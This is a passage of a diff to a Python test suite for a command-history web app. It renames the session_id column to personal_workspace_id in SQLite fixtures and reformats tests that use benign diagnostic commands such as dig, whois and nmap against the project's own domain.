-                conn.execute("DELETE FROM snapshots WHERE session_id = ?", (session,))
-                conn.execute("DELETE FROM starred_commands WHERE session_id = ?", (session,))
+                conn.execute("DELETE FROM snapshots WHERE personal_workspace_id = ?", (session,))
+                conn.execute("DELETE FROM starred_commands WHERE personal_workspace_id = ?", (session,))
                 conn.commit()
 
     def test_insights_empty_session_and_explicit_day_clamps(self):
@@ -22122,35 +22625,67 @@ class TestHistoryRoute:
         try:
             conn = sqlite3.connect(DB_PATH)
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output, output_line_count) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
-                (run_ids[4], session, "whois old.darklab.sh", day_sixty,
-                 (now - timedelta(days=60, seconds=-2)).isoformat(), 0, "[]", 1),
+                (
+                    run_ids[4],
+                    session,
+                    "whois old.darklab.sh",
+                    day_sixty,
+                    (now - timedelta(days=60, seconds=-2)).isoformat(),
+                    0,
+                    "[]",
+                    1,
+                ),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output, output_line_count) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
-                (run_ids[0], session, "nmap -sT ip.darklab.sh", day_ten,
-                 (now - timedelta(days=10, seconds=-10)).isoformat(), 0, "[]", 12),
+                (
+                    run_ids[0],
+                    session,
+                    "nmap -sT ip.darklab.sh",
+                    day_ten,
+                    (now - timedelta(days=10, seconds=-10)).isoformat(),
+                    0,
+                    "[]",
+                    12,
+                ),
             )
             conn.execute(
                 "INSERT INTO run_output_summary (run_id, family, value, count) VALUES (?, 'kind', 'error', 1)",
                 (run_ids[0],),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output, output_line_count) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
-                (run_ids[1], session, "curl https://ip.darklab.sh", day_one,
-                 (now - timedelta(days=1, seconds=-5)).isoformat(), 1, "[]", 4),
+                (
+                    run_ids[1],
+                    session,
+                    "curl https://ip.darklab.sh",
+                    day_one,
+                    (now - timedelta(days=1, seconds=-5)).isoformat(),
+                    1,
+                    "[]",
+                    4,
+                ),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output, output_line_count) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
-                (run_ids[2], session, "ping ip.darklab.sh", day_one,
-                 (now - timedelta(days=1, seconds=-15)).isoformat(), -15, "[]", 2),
+                (
+                    run_ids[2],
+                    session,
+                    "ping ip.darklab.sh",
+                    day_one,
+                    (now - timedelta(days=1, seconds=-15)).isoformat(),
+                    -15,
+                    "[]",
+                    2,
+                ),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output, output_line_count) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                 (run_ids[3], session, "sleep 60", today, None, None, "[]", 0),
             )
@@ -22198,7 +22733,8 @@ class TestHistoryRoute:
         try:
             with sqlite3.connect(DB_PATH) as conn:
                 conn.execute(
-                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
+                    "INSERT INTO runs (id, personal_workspace_id, command, started, finished, "
+                    "exit_code, output, output_line_count) "
                     "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                     (
                         run_id,
@@ -22234,7 +22770,8 @@ class TestHistoryRoute:
             for index in range(count):
                 started = now - timedelta(days=index % 20, minutes=index)
                 conn.execute(
-                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
+                    "INSERT INTO runs (id, personal_workspace_id, command, started, finished, "
+                    "exit_code, output, output_line_count) "
                     "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                     (
                         f"{session}-{index}",
@@ -22270,7 +22807,7 @@ class TestHistoryRoute:
             assert data_40["windows"]["constellation"]["sparse"] is False
         finally:
             with sqlite3.connect(DB_PATH) as conn:
-                conn.execute("DELETE FROM runs WHERE session_id IN (?, ?)", (session_25, session_40))
+                conn.execute("DELETE FROM runs WHERE personal_workspace_id IN (?, ?)", (session_25, session_40))
                 conn.commit()
 
     def test_insights_filters_app_builtin_commands(self):
@@ -22291,28 +22828,34 @@ class TestHistoryRoute:
         try:
             with sqlite3.connect(DB_PATH) as conn:
                 conn.execute(
-                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
+                    "INSERT INTO runs (id, personal_workspace_id, command, started, finished, "
+                    "exit_code, output, output_line_count) "
                     "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
-                    (run_ids[0], session, "nmap -sT ip.darklab.sh", day_two,
-                     (now - timedelta(days=2, seconds=-30)).isoformat(), 0, "[]", 12),
+                    (
+                        run_ids[0],
+                        session,
+                        "nmap -sT ip.darklab.sh",
+                        day_two,
+                        (now - timedelta(days=2, seconds=-30)).isoformat(),
+                        0,
+                        "[]",
+                        12,
+                    ),
                 )
                 conn.execute(
-                    "INSERT INTO runs (id, session_id, run_kind, command, started, finished, exit_code, "
+                    "INSERT INTO runs (id, personal_workspace_id, run_kind, command, started, finished, exit_code, "
                     "output, output_line_count) VALUES (?, ?, 'builtin', ?, ?, ?, ?, ?, ?)",
-                    (run_ids[1], session, "pwd", day_one,
-                     (now - timedelta(days=1, seconds=-1)).isoformat(), 0, "[]", 1),
+                    (run_ids[1], session, "pwd", day_one, (now - timedelta(days=1, seconds=-1)).isoformat(), 0, "[]", 1),
                 )
                 conn.execute(
-                    "INSERT INTO runs (id, session_id, run_kind, command, started, finished, exit_code, "
+                    "INSERT INTO runs (id, personal_workspace_id, run_kind, command, started, finished, exit_code, "
                     "output, output_line_count) VALUES (?, ?, 'builtin', ?, ?, ?, ?, ?, ?)",
-                    (run_ids[2], session, "whoami", day_one,
-                     (now - timedelta(days=1, seconds=-1)).isoformat(), 0, "[]", 1),
+                    (run_ids[2], session, "whoami", day_one, (now - timedelta(days=1, seconds=-1)).isoformat(), 0, "[]", 1),
                 )
                 conn.execute(
-                    "INSERT INTO runs (id, session_id, run_kind, command, started, finished, exit_code, "
+                    "INSERT INTO runs (id, personal_workspace_id, run_kind, command, started, finished, exit_code, "
                     "output, output_line_count) VALUES (?, ?, 'builtin', ?, ?, ?, ?, ?, ?)",
-                    (run_ids[3], session, "help", day_one,
-                     (now - timedelta(days=1, seconds=-1)).isoformat(), 0, "[]", 5),
+                    (run_ids[3], session, "help", day_one, (now - timedelta(days=1, seconds=-1)).isoformat(), 0, "[]", 5),
                 )
                 conn.commit()
             data = json.loads(client.get("/history/insights", headers={"X-Session-ID": session}).data)
@@ -22348,19 +22891,16 @@ class TestHistoryRoute:
             with sqlite3.connect(DB_PATH) as conn:
                 conn.executemany(
                     "INSERT INTO runs "
-                    "(id, session_id, command, started, finished, exit_code, output) "
+                    "(id, personal_workspace_id, command, started, finished, exit_code, output) "
                     "VALUES (?, ?, ?, datetime('now'), datetime('now'), ?, '[]')",
                     [
                         (run_ids[0], session_id, "nmap darklab.sh", 0),
-                        *[
-                            (run_ids[index], session_id, f"nmap host-{index}.example", 0)
-                            for index in range(1, 56)
-                        ],
+                        *[(run_ids[index], session_id, f"nmap host-{index}.example", 0) for index in range(1, 56)],
                         (run_ids[56], session_id, "dig example.net", 0),
                     ],
                 )
                 conn.execute(
-                    "INSERT INTO starred_commands (session_id, command) VALUES (?, ?)",
+                    "INSERT INTO starred_commands (personal_workspace_id, command) VALUES (?, ?)",
                     (session_id, "nmap darklab.sh"),
                 )
                 conn.commit()
@@ -22389,23 +22929,20 @@ class TestHistoryRoute:
             assert json.loads(matching.data) == {"ok": True, "deleted_count": 1}
             with sqlite3.connect(DB_PATH) as conn:
                 remaining = conn.execute(
-                    "SELECT id FROM runs WHERE session_id = ?",
+                    "SELECT id FROM runs WHERE personal_workspace_id = ?",
                     (session_id,),
                 ).fetchall()
             assert remaining == [(run_ids[56],)]
         finally:
             with sqlite3.connect(DB_PATH) as conn:
-                conn.execute("DELETE FROM starred_commands WHERE session_id = ?", (session_id,))
-                conn.execute("DELETE FROM runs WHERE session_id = ?", (session_id,))
+                conn.execute("DELETE FROM starred_commands WHERE personal_workspace_id = ?", (session_id,))
+                conn.execute("DELETE FROM runs WHERE personal_workspace_id = ?", (session_id,))
                 conn.commit()
 
     def test_delete_specific_nonexistent_run_returns_ok(self):
         # Deleting a run_id that doesn't exist should still return ok (idempotent)
         client = get_client()
-        resp = client.delete(
-            "/history/nonexistent-run-id",
-            headers={"X-Session-ID": anonymous_session_id('test-session')}
-        )
+        resp = client.delete("/history/nonexistent-run-id", headers={"X-Session-ID": anonymous_session_id("test-session")})
         assert resp.status_code == 200
         assert json.loads(resp.data)["ok"] is True
 
@@ -22434,23 +22971,30 @@ class TestHistoryRoute:
         fallback_artifact_path = Path(RUN_OUTPUT_DIR) / fallback_rel_path
         ensure_run_output_dir()
         with gzip.open(full_artifact_path, "wt", encoding="utf-8") as artifact:
-            artifact.write(json.dumps({
-                "v": RUN_OUTPUT_ARTIFACT_FORMAT_VERSION,
-                "created": "2026-05-28T00:00:00Z",
-                "run_id": full_run_id,
-            }, separators=(",", ":")) + "\n")
+            artifact.write(
+                json.dumps(
+                    {
+                        "v": RUN_OUTPUT_ARTIFACT_FORMAT_VERSION,
+                        "created": "2026-05-28T00:00:00Z",
+                        "run_id": full_run_id,
+                    },
+                    separators=(",", ":"),
+                )
+                + "\n"
+            )
             artifact.write(json.dumps({"text": "full artifact one"}, separators=(",", ":")) + "\n")
             artifact.write(json.dumps({"text": "full artifact two"}, separators=(",", ":")) + "\n")
         fallback_artifact_path.write_bytes(b"not a gzip transcript")
         with sqlite3.connect(DB_PATH) as conn:
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output_preview, output_line_count) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, "
+                "exit_code, output_preview, output_line_count) "
                 "VALUES (?, ?, ?, datetime('now'), datetime('now'), 0, ?, 1)",
                 (owned_run_id, session_id, "nmap darklab.sh", json.dumps([{"text": "443/tcp open https"}])),
             )
             conn.execute(
                 "INSERT INTO runs "
-                "(id, session_id, command, started, finished, exit_code, output_preview, output_line_count, "
+                "(id, personal_workspace_id, command, started, finished, exit_code, output_preview, output_line_count, "
                 "full_output_available, full_output_truncated) "
                 "VALUES (?, ?, ?, datetime('now'), datetime('now'), 0, ?, 2, 1, 0)",
                 (
@@ -22462,7 +23006,7 @@ class TestHistoryRoute:
             )
             conn.execute(
                 "INSERT INTO runs "
-                "(id, session_id, command, started, finished, exit_code, output_preview, output_line_count, "
+                "(id, personal_workspace_id, command, started, finished, exit_code, output_preview, output_line_count, "
                 "full_output_available, full_output_truncated) "
                 "VALUES (?, ?, ?, datetime('now'), datetime('now'), 0, ?, 1, 1, 0)",
                 (
@@ -22473,7 +23017,8 @@ class TestHistoryRoute:
                 ),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output_preview, output_line_count) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, "
+                "exit_code, output_preview, output_line_count) "
                 "VALUES (?, ?, ?, datetime('now'), datetime('now'), 0, ?, 1)",
                 (
                     large_run_id,
@@ -22495,27 +23040,27 @@ class TestHistoryRoute:
                 (fallback_run_id, fallback_rel_path, fallback_artifact_path.stat().st_size),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
+                "INSERT INTO runs (id, personal_workspace_id, command, started) VALUES (?, ?, ?, datetime('now'))",
                 (incomplete_run_id, session_id, "curl darklab.sh"),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
+                "INSERT INTO runs (id, personal_workspace_id, command, started) VALUES (?, ?, ?, datetime('now'))",
                 (running_run_id, session_id, "dig darklab.sh"),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
+                "INSERT INTO runs (id, personal_workspace_id, command, started) VALUES (?, ?, ?, datetime('now'))",
                 (other_run_id, "bulk-delete-other", "whois darklab.sh"),
             )
             conn.execute(
-                "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, datetime('now'), ?)",
+                "INSERT INTO snapshots (id, personal_workspace_id, label, created, content) VALUES (?, ?, ?, datetime('now'), ?)",
                 ("snap-" + owned_run_id, session_id, "owned snapshot", json.dumps([{"text": "snapshot line"}])),
             )
             conn.execute(
-                "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, datetime('now'), ?)",
+                "INSERT INTO snapshots (id, personal_workspace_id, label, created, content) VALUES (?, ?, ?, datetime('now'), ?)",
                 ("snap-" + full_run_id, session_id, "full snapshot", json.dumps([{"text": "snapshot first"}])),
             )
             conn.execute(
-                "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, datetime('now'), ?)",
+                "INSERT INTO snapshots (id, personal_workspace_id, label, created, content) VALUES (?, ?, ?, datetime('now'), ?)",
                 ("snap-" + other_run_id, "bulk-delete-other", "other snapshot", json.dumps([{"text": "other line"}])),
             )
             conn.commit()
@@ -22605,16 +23150,15 @@ class TestHistoryRoute:
             {"kind": "snapshot", "id": "snap-" + other_run_id, "status": "not_found"},
         ]
         assert truncated_export_resp.status_code == 200
-        truncated_exported = [
-            json.loads(line)
-            for line in truncated_export_resp.data.decode("utf-8").splitlines()
+        truncated_exported = [json.loads(line) for line in truncated_export_resp.data.decode("utf-8").splitlines()]
+        assert truncated_exported == [
+            {
+                "kind": "summary",
+                "items": 0,
+                "skipped": [],
+                "truncated": True,
+            }
         ]
-        assert truncated_exported == [{
-            "kind": "summary",
-            "items": 0,
-            "skipped": [],
-            "truncated": True,
-        }]
         assert txt_export_resp.status_code == 200
         assert txt_export_resp.content_type == "text/plain; charset=utf-8"
         txt_export = txt_export_resp.data.decode("utf-8")
@@ -22708,7 +23252,7 @@ class TestHistoryRoute:
         client = get_client()
         resp = client.get(
             "/history/nonexistent-run-id",
-            headers={"X-Session-ID": anonymous_session_id('history-missing-run-session')},
+            headers={"X-Session-ID": anonymous_session_id("history-missing-run-session")},
         )
         assert resp.status_code == 404
 
@@ -22731,7 +23275,8 @@ class TestHistoryRoute:
             with sqlite3.connect(DB_PATH) as conn:
                 conn.execute(
                     "INSERT INTO runs "
-                    "(id, session_id, run_kind, command, started, finished, exit_code, output_preview, output_line_count) "
+                    "(id, personal_workspace_id, run_kind, command, started, finished, "
+                    "exit_code, output_preview, output_line_count) "
                     "VALUES (?, ?, 'external', 'nmap -sV darklab.sh', ?, ?, 0, ?, ?)",
                     (
                         run_id,
@@ -22743,13 +23288,14 @@ class TestHistoryRoute:
                     ),
                 )
                 conn.execute(
-                    "INSERT INTO runs (id, session_id, run_kind, command, started, output_preview, output_line_count) "
+                    "INSERT INTO runs (id, personal_workspace_id, run_kind, command, started, output_preview, output_line_count) "
                     "VALUES (?, ?, 'external', 'sleep 30', ?, ?, 1)",
                     (active_run_id, session, "2026-05-23T11:00:00+00:00", json.dumps(output_rows[:1])),
                 )
                 conn.execute(
                     "INSERT INTO runs "
-                    "(id, session_id, run_kind, command, started, finished, exit_code, output_preview, output_line_count) "
+                    "(id, personal_workspace_id, run_kind, command, started, finished, "
+                    "exit_code, output_preview, output_line_count) "
                     "VALUES (?, ?, 'external', 'true', ?, ?, 0, ?, 1)",
                     (
                         no_context_run_id,
@@ -22761,7 +23307,8 @@ class TestHistoryRoute:
                 )
                 conn.execute(
                     "INSERT INTO runs "
-                    "(id, session_id, run_kind, command, started, finished, exit_code, output_preview, output_line_count) "
+                    "(id, personal_workspace_id, run_kind, command, started, finished, "
+                    "exit_code, output_preview, output_line_count) "
                     "VALUES (?, ?, 'external', 'nmap darklab.sh', ?, ?, 0, ?, ?)",
                     (
                         guard_run_id,
@@ -22774,17 +23321,23 @@ class TestHistoryRoute:
                 )
                 conn.commit()
 
-            with mock.patch.dict(config.CFG, {
-                "ai_enabled": True,
-                "ai_feature_summary": True,
-                "ai_feature_next_commands": True,
-                "ai_model": "llama3.1:8b",
-                "ai_max_input_chars": 8000,
-                "ai_max_queue_depth": 1000,
-                "ai_rate_limit_per_session_hour": 20,
-                "ai_rate_limit_global_per_minute": 20,
-                "share_redaction_enabled": False,
-            }), mock.patch.object(process, "redis_client", process._FakeRedisClient()):
+            with (
+                mock.patch.dict(
+                    config.CFG,
+                    {
+                        "ai_enabled": True,
+                        "ai_feature_summary": True,
+                        "ai_feature_next_commands": True,
+                        "ai_model": "llama3.1:8b",
+                        "ai_max_input_chars": 8000,
+                        "ai_max_queue_depth": 1000,
+                        "ai_rate_limit_per_session_hour": 20,
+                        "ai_rate_limit_global_per_minute": 20,
+                        "share_redaction_enabled": False,
+                    },
+                ),
+                mock.patch.object(process, "redis_client", process._FakeRedisClient()),
+            ):
                 with mock.patch.object(ai_assists.log, "info") as info_log:
                     queued = client.post(f"/runs/{run_id}/ai-summary", json={}, headers={"X-Session-ID": session})
                     suggested = client.post(f"/runs/{run_id}/ai-next-commands", json={}, headers={"X-Session-ID": session})
@@ -22846,35 +23399,63 @@ class TestHistoryRoute:
                         "ai_feature_disabled",
                     ),
                 ):
-                    with mock.patch.dict(config.CFG, {**base_guard_cfg, **cfg_patch}, clear=False), \
-                         mock.patch.object(process, "redis_client", process._FakeRedisClient()):
-                        guard_cases.append((expected_status, expected_error, client.post(
-                            path,
-                            json={},
-                            headers={"X-Session-ID": session},
-                        )))
+                    with (
+                        mock.patch.dict(config.CFG, {**base_guard_cfg, **cfg_patch}, clear=False),
+                        mock.patch.object(process, "redis_client", process._FakeRedisClient()),
+                    ):
+                        guard_cases.append(
+                            (
+                                expected_status,
+                                expected_error,
+                                client.post(
+                                    path,
+                                    json={},
+                                    headers={"X-Session-ID": session},
+                                ),
+                            )
+                        )
                 busy_lock = mock.MagicMock()
                 busy_lock.__enter__.return_value = False
                 busy_lock.__exit__.return_value = False
-                with mock.patch.dict(config.CFG, base_guard_cfg, clear=False), \
-                     mock.patch.object(process, "redis_client", process._FakeRedisClient()), \
-                     mock.patch.object(ai_assists, "enqueue_lock", return_value=busy_lock):
-                    guard_cases.append((429, "ai_busy", client.post(
-                        f"/runs/{guard_run_id}/ai-summary",
-                        json={},
-                        headers={"X-Session-ID": session},
-                    )))
-                with mock.patch.dict(config.CFG, base_guard_cfg, clear=False), \
-                     mock.patch.object(process, "redis_client", None):
-                    guard_cases.append((503, "ai_unavailable", client.post(
-                        f"/runs/{guard_run_id}/ai-summary",
-                        json={},
-                        headers={"X-Session-ID": session},
-                    )))
-                with mock.patch.dict(config.CFG, {
-                    **base_guard_cfg,
-                    "ai_rate_limit_per_session_hour": 1,
-                }, clear=False), mock.patch.object(process, "redis_client", process._FakeRedisClient()):
+                with (
+                    mock.patch.dict(config.CFG, base_guard_cfg, clear=False),
+                    mock.patch.object(process, "redis_client", process._FakeRedisClient()),
+                    mock.patch.object(ai_assists, "enqueue_lock", return_value=busy_lock),
+                ):
+                    guard_cases.append(
+                        (
+                            429,
+                            "ai_busy",
+                            client.post(
+                                f"/runs/{guard_run_id}/ai-summary",
+                                json={},
+                                headers={"X-Session-ID": session},
+                            ),
+                        )
+                    )
+                with mock.patch.dict(config.CFG, base_guard_cfg, clear=False), mock.patch.object(process, "redis_client", None):
+                    guard_cases.append(
+                        (
+                            503,
+                            "ai_unavailable",
+                            client.post(
+                                f"/runs/{guard_run_id}/ai-summary",
+                                json={},
+                                headers={"X-Session-ID": session},
+                            ),
+                        )
+                    )
+                with (
+                    mock.patch.dict(
+                        config.CFG,
+                        {
+                            **base_guard_cfg,
+                            "ai_rate_limit_per_session_hour": 1,
+                        },
+                        clear=False,
+                    ),
+                    mock.patch.object(process, "redis_client", process._FakeRedisClient()),
+                ):
                     rate_first = client.post(
                         f"/runs/{guard_run_id}/ai-summary",
                         json={},
@@ -22885,9 +23466,11 @@ class TestHistoryRoute:
                         json={},
                         headers={"X-Session-ID": session},
                     )
-                with mock.patch.dict(config.CFG, base_guard_cfg, clear=False), \
-                     mock.patch.object(process, "redis_client", process._FakeRedisClient()), \
-                     mock.patch.object(ai_assists, "build_run_context", return_value=mock.Mock(useful=False)):
+                with (
+                    mock.patch.dict(config.CFG, base_guard_cfg, clear=False),
+                    mock.patch.object(process, "redis_client", process._FakeRedisClient()),
+                    mock.patch.object(ai_assists, "build_run_context", return_value=mock.Mock(useful=False)),
+                ):
                     no_context = client.post(
                         f"/runs/{no_context_run_id}/ai-summary",
                         json={},
@@ -22993,17 +23576,17 @@ class TestHistoryRoute:
         try:
             conn = sqlite3.connect(DB_PATH)
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?)",
                 (run_ids[0], session, "echo one", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]"),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?)",
                 (run_ids[1], session, "echo two", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]"),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?)",
                 (run_ids[2], session, "echo three", "2026-01-01T00:00:05", "2026-01-01T00:00:06", 0, "[]"),
             )
@@ -23036,7 +23619,7 @@ class TestHistoryRoute:
         try:
             conn = sqlite3.connect(DB_PATH)
             conn.executemany(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?)",
                 [(run_id, sid, cmd, started, started, code, "[]") for run_id, sid, cmd, started, code in rows],
             )
@@ -23059,7 +23642,7 @@ class TestHistoryRoute:
             assert len(data["runs"]) == 3
         finally:
             conn = sqlite3.connect(DB_PATH)
-            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
+            conn.execute("DELETE FROM runs WHERE personal_workspace_id = ?", (session,))
             conn.commit()
             conn.close()
 
@@ -23070,12 +23653,12 @@ class TestHistoryRoute:
         try:
             conn = sqlite3.connect(DB_PATH)
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?)",
                 (run_ids[0], session, "dig darklab.sh A", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]"),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?)",
                 (run_ids[1], session, "nmap -sV darklab.sh", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]"),
             )
@@ -23109,17 +23692,17 @@ class TestHistoryRoute:
         try:
             conn = sqlite3.connect(DB_PATH)
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?)",
                 (run_ids[0], session, "ping darklab.sh", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]"),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?)",
                 (run_ids[1], session, "dig darklab.sh A", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]"),
             )
             conn.execute(
-                "INSERT INTO starred_commands (session_id, command) VALUES (?, ?)",
+                "INSERT INTO starred_commands (personal_workspace_id, command) VALUES (?, ?)",
                 (session, "dig darklab.sh A"),
             )
             conn.commit()
@@ -23139,7 +23722,7 @@ class TestHistoryRoute:
             conn = sqlite3.connect(DB_PATH)
             conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
             conn.execute(
-                "DELETE FROM starred_commands WHERE session_id = ? AND command IN (?, ?)",
+                "DELETE FROM starred_commands WHERE personal_workspace_id = ? AND command IN (?, ?)",
                 (session, "ping darklab.sh", "dig darklab.sh A"),
             )
             conn.commit()
@@ -23151,18 +23734,18 @@ class TestHistoryRoute:
         try:
             conn = sqlite3.connect(DB_PATH)
             conn.execute(
-                "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, ?, ?)",
+                "INSERT INTO snapshots (id, personal_workspace_id, label, created, content) VALUES (?, ?, ?, ?, ?)",
                 ("snap-history-1", session, "baseline scan", "2026-01-01T00:00:03", "[]"),
             )
             conn.execute(
                 "INSERT INTO entity_labels "
-                "(id, session_id, entity_type, entity_id, label, created) "
+                "(id, personal_workspace_id, entity_type, entity_id, label, created) "
                 "VALUES (?, ?, 'snapshot', ?, 'handoff', ?)",
                 ("label-snap-history-1", session, "snap-history-1", "2026-01-01T00:00:04"),
             )
             conn.execute(
                 "INSERT INTO entity_notes "
-                "(id, session_id, entity_type, entity_id, body, created, updated) "
+                "(id, personal_workspace_id, entity_type, entity_id, body, created, updated) "
                 "VALUES (?, ?, 'snapshot', ?, 'snapshot note', ?, ?)",
                 (
                     "note-snap-history-1",
@@ -23204,7 +23787,7 @@ class TestHistoryRoute:
         try:
             conn = sqlite3.connect(DB_PATH)
             conn.executemany(
-                "INSERT INTO runs (id, session_id, run_kind, command, started, finished, exit_code, output) "
+                "INSERT INTO runs (id, personal_workspace_id, run_kind, command, started, finished, exit_code, output) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                 [
                     (
@@ -23232,14 +23815,18 @@ class TestHistoryRoute:
             conn.commit()
             conn.close()
 
-            builtins = json.loads(client.get(
-                "/history?type=runs_builtin&include_total=1",
-                headers={"X-Session-ID": session},
-            ).data)
-            external = json.loads(client.get(
-                "/history?type=runs_external&include_total=1",
-                headers={"X-Session-ID": session},
-            ).data)
+            builtins = json.loads(
+                client.get(
+                    "/history?type=runs_builtin&include_total=1",
+                    headers={"X-Session-ID": session},
+                ).data
+            )
+            external = json.loads(
+                client.get(
+                    "/history?type=runs_external&include_total=1",
+                    headers={"X-Session-ID": session},
+                ).data
+            )
 
             assert [item["id"] for item in builtins["items"]] == [run_ids[0]]
             assert builtins["items"][0]["run_kind"] == "builtin"
@@ -23269,7 +23856,7 @@ class TestHistoryRoute:
         try:
             conn = sqlite3.connect(DB_PATH)
             conn.executemany(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?)",
                 [
                     (linked_run, session, "dig darklab.sh A", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]"),
@@ -23277,7 +23864,7 @@ class TestHistoryRoute:
                 ],
             )
             conn.executemany(
-                "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, ?, ?)",
+                "INSERT INTO snapshots (id, personal_workspace_id, label, created, content) VALUES (?, ?, ?, ?, ?)",
                 [
                     (linked_snapshot, session, "linked snapshot", "2026-01-01T00:00:05", "[]"),
                     (other_snapshot, session, "other snapshot", "2026-01-01T00:00:06", "[]"),
@@ -23321,9 +23908,9 @@ class TestHistoryRoute:
         finally:
             conn = sqlite3.connect(DB_PATH)
             conn.execute("DELETE FROM project_links WHERE project_id = ?", (project["id"],))
-            conn.execute("DELETE FROM snapshots WHERE session_id = ?", (session,))
-            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
-            conn.execute("DELETE FROM projects WHERE session_id = ?", (session,))
+            conn.execute("DELETE FROM snapshots WHERE personal_workspace_id = ?", (session,))
+            conn.execute("DELETE FROM runs WHERE personal_workspace_id = ?", (session,))
+            conn.execute("DELETE FROM projects WHERE personal_workspace_id = ?", (session,))
             conn.commit()
             conn.close()
 
@@ -23334,13 +23921,13 @@ class TestHistoryRoute:
         try:
             conn = sqlite3.connect(DB_PATH)
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?)",
                 (run_ids[0], session, "dig darklab.sh A", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]"),
             )
             conn.execute(
                 "INSERT INTO run_file_artifacts "
-                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
+                "(id, personal_workspace_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                 (
                     "artifact-search-run-1",
@@ -23356,19 +23943,19 @@ class TestHistoryRoute:
             )
             conn.execute(
                 "INSERT INTO findings "
